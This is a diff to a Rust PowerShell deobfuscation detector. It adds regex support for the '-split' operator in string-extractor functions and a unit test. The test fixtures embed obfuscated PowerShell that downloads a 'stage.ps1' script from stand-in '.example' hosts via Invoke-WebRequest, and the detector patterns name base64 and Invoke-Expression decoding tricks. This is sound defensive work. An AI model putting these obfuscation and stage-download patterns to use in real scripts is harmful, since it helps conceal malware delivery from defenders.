@@ -976,6 +976,14 @@ static PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*-(?:[ic])?split\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
+    )
+    .expect("ps literal split operator index extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
@@ -3299,13 +3307,19 @@ fn expand_literal_replace_extractor_calls(text: &str) -> String {
 
 fn expand_literal_split_index_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
-    if !lower.contains("function ") || !lower.contains(".split") || !text.contains('\'') {
+    if !lower.contains("function ")
+        || (!lower.contains(".split") && !lower.contains("-split"))
+        || !text.contains('\'')
+    {
         return text.to_string();
     }
 
     let mut out = text.to_string();
     for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
-        let Some(caps) = PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE.captures(&body) else {
+        let Some(caps) = PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE
+            .captures(&body)
+            .or_else(|| PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE.captures(&body))
+        else {
             continue;
         };
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
@@ -4304,7 +4318,9 @@ impl PsObfuscationSignals {
         let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
         let dot_replace = lower.contains(".replace");
         let substring = lower.contains(".substring");
-        let split_index = has_function_def && lower.contains(".split") && text.contains('[');
+        let split_index = has_function_def
+            && (lower.contains(".split") || lower.contains("-split"))
+            && text.contains('[');
         let embedded_single_quote_assignment = has_embedded_single_quote_assignment_signal(text);
         let doubled_single_quote = text.contains("''");
         let skip_nth = has_function_def
@@ -6335,6 +6351,21 @@ Piece 1 '|' 'noise|Invoke-WebRequest -Uri https://ps-split-reordered.example/sta
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-split-reordered.example/stage.ps1'"),
             "reordered split-index extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_split_operator_index_extractor_call_is_rewritten() {
+        let text = r#"function Piece($value,$sep,$index) {
+  return ($value -split $sep)[$index]
+}
+Piece 'noise|Invoke-WebRequest -Uri https://ps-split-operator.example/stage.ps1|tail' '|' 1"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains("'Invoke-WebRequest -Uri https://ps-split-operator.example/stage.ps1'"),
+            "split-operator extractor call was not rewritten:\n{out}"
         );
     }
 }
